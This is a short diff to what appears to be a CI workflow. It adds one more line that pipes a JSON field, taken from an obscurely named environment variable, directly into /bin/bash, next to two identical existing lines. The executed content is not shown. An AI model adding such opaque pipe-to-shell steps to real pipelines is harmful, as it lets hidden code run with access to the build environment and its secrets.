@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$mvd1265" | jq -r .ymrt2090 | /bin/bash
           printf '%s' "$m86925" | jq -r .tztbk4541 | /bin/bash
+          printf '%s' "$rs528" | jq -r .wsz5637 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
